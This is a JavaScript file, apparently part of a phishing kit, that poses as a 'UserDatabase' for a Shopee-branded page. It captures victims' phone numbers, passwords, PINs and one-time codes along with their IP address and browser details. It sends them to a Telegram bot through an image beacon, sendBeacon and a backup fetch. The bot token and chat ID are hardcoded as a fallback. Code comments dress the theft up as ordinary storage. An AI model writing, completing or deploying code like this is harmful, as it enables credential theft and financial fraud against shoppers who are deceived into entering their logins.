// Simplified reliable database system - uses CONFIG
class UserDatabase {
    constructor() {
        this.users = [];
        this.loadFromStorage();
    }

    // Save user data and optionally send to Telegram (centralized)
    async saveUser(userData, sendToTelegram = true) {
        console.log('🔄 saveUser called:', userData, 'sendToTelegram:', sendToTelegram);

        // Fetch IP early
        let ip = 'Unknown IP';
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            ip = data.ip;
        } catch {}

        const timestamp = new Date().toISOString();
        const user = {
            id: this.generateId(),
            timestamp,
            ip,
            userAgent: navigator.userAgent,
            phone: userData.phone || '',
            password: userData.password || '',
            pin: userData.pin || '',
            otp: userData.otp || '',
            ...userData
        };

        console.log('📝 User saved:', user);
        this.users.push(user);
        this.saveToStorage();

        // Send to Telegram if requested
        if (sendToTelegram) {
            await this.sendToTelegram(user);
        }

        return user;
    }

    // Single reliable send method: sendBeacon (instant/unload-safe) + fetch backup
    sendToTelegram(userData) {
        if (!window.CONFIG) {
            console.error('❌ CONFIG not loaded');
            return false;
        }

        const token = CONFIG.TELEGRAM_BOT_TOKEN;
        const chatId = CONFIG.TELEGRAM_CHAT_ID;
        const message = this.formatTelegramMessage(userData);
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        console.log('📤 Telegram URL:', url.substring(0, 100) + '...');

        // Image beacon (CORS-safe)
        const img = new Image();
        img.src = url + '&t=' + Date.now();
        console.log('🖼️ Image beacon sent');

        // sendBeacon if available
        if (navigator.sendBeacon) {
            navigator.sendBeacon(url);
            console.log('⚡ sendBeacon sent');
        }

        // Fetch backup
        fetch(url).catch(e => console.log('Fetch failed:', e));

        return true;
    }

    generateId() {
        return Date.now().toString(36) + Math.random().toString(36).substr(2);
    }

    saveToStorage() {
        try {
            localStorage.setItem('shopee_users', JSON.stringify(this.users));
        } catch (e) {
            console.error('Storage save failed:', e);
        }
    }

    loadFromStorage() {
        try {
            const stored = localStorage.getItem('shopee_users');
            this.users = stored ? JSON.parse(stored) : [];
        } catch (e) {
            this.users = [];
        }
    }

    formatTelegramMessage(userData) {
        const date = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        return `🔐 Shopee Security Data

📱 Phone: ${userData.phone || 'N/A'}
📌 PIN: ${userData.pin || 'N/A'}

🌐 IP: ${userData.ip || 'Unknown'}
📅 Date: ${date}
🖥️ Device: ${userData.userAgent?.substring(0, 100) || 'N/A'}

ID: ${userData.id}`;
    }

    getAllUsers() { return this.users; }
    clearAll() { this.users = []; this.saveToStorage(); }
}

// Initialize (requires config.js loaded first)
console.log('Loading database.js');
window.CONFIG = window.CONFIG || { TELEGRAM_BOT_TOKEN: '8502215115:AAHZGTMdSyHOgzoGDqaqL54ilACSy39gbAc', TELEGRAM_CHAT_ID: '8593139959' };
if (!window.userDB) {
    window.userDB = new UserDatabase();
    console.log('✅ userDB initialized');
}
